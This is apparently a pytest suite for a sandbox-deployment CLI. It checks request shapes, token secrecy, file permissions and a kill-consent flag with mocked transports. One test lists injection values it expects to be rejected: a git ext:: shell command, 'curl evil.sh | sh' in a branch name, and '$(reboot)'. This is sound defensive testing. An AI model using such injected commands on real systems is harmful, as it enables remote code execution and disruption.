"""
Deterministic tests for the Superserve runtime block. No network, no key.

Both transports (`_request` control plane, `_data_request` data plane) are replaced with
recorders, so the suite proves the documented call sequence, body shapes, and state-file
handling without touching Superserve — the same discipline as the payments tests.
"""
import importlib.util
import json
import os
import stat
import sys

import pytest

HERE = os.path.dirname(os.path.abspath(__file__))
RUNTIME_PATH = os.path.join(os.path.dirname(HERE), "code", "runtime.py")

_spec = importlib.util.spec_from_file_location("runtime", RUNTIME_PATH)
runtime = importlib.util.module_from_spec(_spec)
sys.modules["runtime"] = runtime
_spec.loader.exec_module(runtime)


# ── helpers ───────────────────────────────────────────────────────────────────
class ControlRecorder:
    """Stands in for runtime._request. Records (method, path, payload); replays canned responses."""

    def __init__(self, responses=None):
        self.calls = []
        self.responses = responses or {}

    def __call__(self, method, path, payload=None):
        self.calls.append((method, path, payload))
        for (m, prefix), value in self.responses.items():
            if m == method and path.startswith(prefix):
                return value
        return {}

    def payload_for(self, method, path_prefix):
        for m, p, payload in self.calls:
            if m == method and p.startswith(path_prefix):
                return payload
        raise AssertionError(f"{method} {path_prefix} was never called")


class DataRecorder:
    """Stands in for runtime._data_request. Scripted responses, consumed in call order."""

    def __init__(self, script=None):
        self.calls = []
        self.script = list(script or [])

    def __call__(self, sid, token, method, path, body=None, raw=False, content_type=None):
        self.calls.append({"sid": sid, "token": token, "method": method,
                           "path": path, "body": body, "raw": raw})
        if self.script:
            return self.script.pop(0)
        return b"" if raw else {"stdout": "", "stderr": "", "exit_code": 0}


SANDBOX_CREATED = {"id": "sbx_123", "access_token": "tok_SECRET", "status": "active"}


@pytest.fixture
def state_file(tmp_path):
    return str(tmp_path / "state.json")


@pytest.fixture(autouse=True)
def clean_env(monkeypatch):
    """Nothing leaks in from the developer's shell."""
    monkeypatch.delenv("SUPERSERVE_API_KEY", raising=False)
    monkeypatch.delenv("RUNTIME_STATE", raising=False)
    monkeypatch.delenv("NIGHTSHIFT_REPO", raising=False)


def deploy_recorders():
    control = ControlRecorder({("POST", "/sandboxes"): SANDBOX_CREATED})
    data = DataRecorder([
        {"stdout": "", "stderr": "", "exit_code": 0},          # git clone
        {"stdout": "started\n", "stderr": "", "exit_code": 0},  # supervisor nohup
    ])
    return control, data


def run(monkeypatch, control, data, argv):
    monkeypatch.setattr(runtime, "_request", control)
    monkeypatch.setattr(runtime, "_data_request", data)
    return runtime.main(argv)


# ── deploy ────────────────────────────────────────────────────────────────────
def test_deploy_creates_sandbox_with_documented_shape(monkeypatch, state_file, capsys):
    control, data = deploy_recorders()
    run(monkeypatch, control, data, ["--state", state_file, "deploy"])

    body = control.payload_for("POST", "/sandboxes")
    assert body["name"] == "nightshift-loop"
    assert body["from_template"] == "superserve/claude-code"
    assert body["metadata"] == {"role": "nightshift-loop"}
    assert body["preview_access"] == "public"
    # Secrets are NAMES the operator registered with Superserve — never values.
    assert body["secrets"] == {"ANTHROPIC_API_KEY": "pioneer-key",
                               "STRIPE_API_KEY": "stripe-key"}
    for value in body["secrets"].values():
        assert not value.startswith(("sk-", "sk_", "rk_", "ss_"))
    # The dashboard must bind beyond loopback or the preview URL routes to nothing.
    assert body["env_vars"]["DASH_BIND"] == "0.0.0.0"
    assert body["env_vars"]["ANTHROPIC_BASE_URL"] == "https://api.pioneer.ai/v1"
    assert body["env_vars"]["APPROVER_POLICY"].endswith("policy/policy.md")


def test_deploy_accepts_legacy_anthropic_secret_flag(monkeypatch, state_file):
    control, data = deploy_recorders()
    run(monkeypatch, control, data, ["--state", state_file, "deploy",
                                    "--anthropic-secret", "legacy-anthropic-key"])

    body = control.payload_for("POST", "/sandboxes")
    assert body["secrets"]["ANTHROPIC_API_KEY"] == "legacy-anthropic-key"


def test_deploy_sequence_clone_then_supervisor_then_preview(monkeypatch, state_file):
    control, data = deploy_recorders()
    run(monkeypatch, control, data, ["--state", state_file, "deploy"])

    assert [c["method"] for c in data.calls] == ["POST", "POST"]
    clone_command = json.loads(data.calls[0]["body"])["command"]
    assert "git clone" in clone_command
    # The Superserve credential proxy is only for brokered provider secrets. Public GitHub
    # traffic goes direct, avoiding the proxy's private CA and never carrying its auth token.
    for proxy_var in ("HTTPS_PROXY", "HTTP_PROXY", "ALL_PROXY"):
        assert f"-u {proxy_var}" in clone_command
    assert "supervisor.sh" in json.loads(data.calls[1]["body"])["command"]
    # Preview port published only after the supervisor that serves it is running.
    assert [(m, p) for m, p, _ in control.calls] == [
        ("POST", "/sandboxes"),
        ("POST", "/sandboxes/sbx_123/preview-ports"),
    ]
    assert control.payload_for("POST", "/sandboxes/sbx_123/preview-ports") == {"port": 8787}


def test_deploy_persists_state_with_owner_only_perms(monkeypatch, state_file):
    control, data = deploy_recorders()
    run(monkeypatch, control, data, ["--state", state_file, "deploy"])

    st = json.load(open(state_file))
    assert st["sandbox_id"] == "sbx_123"
    assert st["access_token"] == "tok_SECRET"
    # The access token grants shell access to the company's VM: owner read/write only.
    assert stat.S_IMODE(os.stat(state_file).st_mode) == 0o600


def test_deploy_stops_cleanly_when_clone_fails(monkeypatch, state_file):
    control = ControlRecorder({("POST", "/sandboxes"): SANDBOX_CREATED})
    data = DataRecorder([{"stdout": "", "stderr": "fatal: repo not found", "exit_code": 128}])
    with pytest.raises(SystemExit) as exc:
        run(monkeypatch, control, data, ["--state", state_file, "deploy"])
    # sys.exit(str) carries the message in .code — assert on it, not on captured streams.
    assert "clone failed" in str(exc.value.code)
    assert "repo not found" in str(exc.value.code)


def test_deploy_never_prints_the_access_token(monkeypatch, state_file, capsys):
    control, data = deploy_recorders()
    run(monkeypatch, control, data, ["--state", state_file, "deploy"])
    out = capsys.readouterr()
    assert "tok_SECRET" not in out.out + out.err


@pytest.mark.parametrize("argv", [
    ["deploy", "--repo", "ext::sh -c 'touch /tmp/pwned'"],          # git transport injection
    ["deploy", "--repo", "file:///etc"],                            # non-https transport
    ["deploy", "--branch", "main; curl evil.sh | sh"],              # shell metacharacters
    ["deploy", "--branch", "$(reboot)"],
])
def test_deploy_rejects_injectable_repo_or_branch_before_any_call(monkeypatch, state_file, argv):
    guard_control, guard_data = ControlRecorder(), DataRecorder()
    with pytest.raises(SystemExit) as exc:
        run(monkeypatch, guard_control, guard_data, ["--state", state_file] + argv)
    assert guard_control.calls == [] and guard_data.calls == []     # refused before the network
    assert "--repo" in str(exc.value.code) or "--branch" in str(exc.value.code)


def test_deploy_quotes_repo_and_branch_in_the_clone_command(monkeypatch, state_file):
    control, data = deploy_recorders()
    run(monkeypatch, control, data,
        ["--state", state_file, "deploy", "--branch", "surya/autonomy"])
    cmd = json.loads(data.calls[0]["body"])["command"]
    assert "--branch surya/autonomy --" in cmd                      # `--` ends option parsing for git


def test_deploy_private_flag_gates_the_preview(monkeypatch, state_file):
    control, data = deploy_recorders()
    run(monkeypatch, control, data, ["--state", state_file, "deploy", "--private"])
    assert control.payload_for("POST", "/sandboxes")["preview_access"] == "private"


# ── status / url ──────────────────────────────────────────────────────────────
def test_status_reads_state_and_reports_dashboard_url(monkeypatch, state_file, capsys):
    control, data = deploy_recorders()
    run(monkeypatch, control, data, ["--state", state_file, "deploy"])
    capsys.readouterr()

    status_control = ControlRecorder({("GET", "/sandboxes/sbx_123"): {"id": "sbx_123", "status": "active"}})
    run(monkeypatch, status_control, DataRecorder(), ["--state", state_file, "status", "--json"])
    payload = json.loads(capsys.readouterr().out)
    assert payload == {"sandbox_id": "sbx_123", "status": "active",
                       "dashboard": "https://8787-sbx_123.sandbox.superserve.ai"}


def test_status_falls_back_to_metadata_discovery(monkeypatch, tmp_path, capsys):
    missing = str(tmp_path / "nope.json")
    control = ControlRecorder({("GET", "/sandboxes?metadata.role=nightshift-loop"):
                               [{"id": "sbx_found", "status": "paused"}]})
    run(monkeypatch, control, DataRecorder(), ["--state", missing, "status", "--json"])
    payload = json.loads(capsys.readouterr().out)
    assert payload["sandbox_id"] == "sbx_found"
    assert payload["status"] == "paused"


def test_url_prints_the_preview_url(monkeypatch, state_file, capsys):
    control, data = deploy_recorders()
    run(monkeypatch, control, data, ["--state", state_file, "deploy"])
    capsys.readouterr()
    run(monkeypatch, ControlRecorder(), DataRecorder(), ["--state", state_file, "url"])
    assert capsys.readouterr().out.strip() == "https://8787-sbx_123.sandbox.superserve.ai"


# ── resume rotates the token ──────────────────────────────────────────────────
def test_resume_persists_the_rotated_access_token(monkeypatch, state_file, capsys):
    control, data = deploy_recorders()
    run(monkeypatch, control, data, ["--state", state_file, "deploy"])

    resume_control = ControlRecorder({("POST", "/sandboxes/sbx_123/resume"):
                                      {"id": "sbx_123", "status": "active",
                                       "access_token": "tok_ROTATED"}})
    run(monkeypatch, resume_control, DataRecorder(), ["--state", state_file, "resume"])
    assert json.load(open(state_file))["access_token"] == "tok_ROTATED"
    out = capsys.readouterr()
    assert "tok_ROTATED" not in out.out + out.err


# ── kill needs explicit consent ───────────────────────────────────────────────
def test_kill_without_yes_refuses_and_calls_nothing(monkeypatch, state_file, capsys):
    control, data = deploy_recorders()
    run(monkeypatch, control, data, ["--state", state_file, "deploy"])

    guard = ControlRecorder()
    with pytest.raises(SystemExit):
        run(monkeypatch, guard, DataRecorder(), ["--state", state_file, "kill"])
    assert guard.calls == []
    assert os.path.exists(state_file)                     # nothing destroyed


def test_kill_with_yes_deletes_sandbox_and_state(monkeypatch, state_file):
    control, data = deploy_recorders()
    run(monkeypatch, control, data, ["--state", state_file, "deploy"])

    killer = ControlRecorder()
    run(monkeypatch, killer, DataRecorder(), ["--state", state_file, "kill", "--yes"])
    assert [(m, p) for m, p, _ in killer.calls] == [("DELETE", "/sandboxes/sbx_123")]
    assert not os.path.exists(state_file)


# ── pull mirrors state files ──────────────────────────────────────────────────
def test_pull_writes_fetched_files_to_dest(monkeypatch, state_file, tmp_path, capsys):
    control, data = deploy_recorders()
    run(monkeypatch, control, data, ["--state", state_file, "deploy"])

    payloads = [b'{"tasks": []}', b'{"verdict":"approve"}\n', b"log", b"sqlite", b"sup"]
    puller = DataRecorder(list(payloads))
    dest = str(tmp_path / "mirror")
    run(monkeypatch, ControlRecorder(), puller, ["--state", state_file, "pull", "--dest", dest])

    assert sorted(os.listdir(dest)) == sorted(
        ["tasks.json", "decisions.jsonl", "approver.log", "crm.db", "supervisor.log"])
    assert open(os.path.join(dest, "tasks.json"), "rb").read() == payloads[0]
    # Every fetch is a data-plane GET /files with an encoded absolute path.
    assert all(c["method"] == "GET" and c["path"].startswith("/files?path=") for c in puller.calls)


# ── secrets hygiene ───────────────────────────────────────────────────────────
def test_missing_api_key_exits_and_opens_no_socket(monkeypatch, tmp_path):
    def boom(*_a, **_k):
        raise AssertionError("no HTTP request may be attempted without SUPERSERVE_API_KEY")
    monkeypatch.setattr(runtime.urllib.request, "urlopen", boom)
    # No state file → status falls through to metadata discovery → key check fires first.
    with pytest.raises(SystemExit) as exc:
        runtime.main(["--state", str(tmp_path / "nope.json"), "status"])
    assert "SUPERSERVE_API_KEY" in str(exc.value.code)


def test_api_error_never_echoes_the_key(monkeypatch, capsys):
    secret = "ss_live_NEVER_PRINT_ME"
    monkeypatch.setenv("SUPERSERVE_API_KEY", secret)

    class FakeHTTPError(runtime.urllib.error.HTTPError):
        def __init__(self):
            super().__init__("https://api.superserve.ai/sandboxes", 429, "Too Many", {}, None)

        def read(self):
            return json.dumps({"error": {"code": "too_many_sandboxes",
                                         "message": "sandbox cap reached"}}).encode()

    monkeypatch.setattr(runtime.urllib.request, "urlopen",
                        lambda *_a, **_k: (_ for _ in ()).throw(FakeHTTPError()))
    with pytest.raises(SystemExit) as exc:
        runtime._request("GET", "/sandboxes")
    msg = str(exc.value.code)
    assert "sandbox cap reached" in msg                   # the API's own words reach the operator
    assert secret not in msg
    assert "too_many" not in capsys.readouterr().out      # and nothing leaked to stdout either
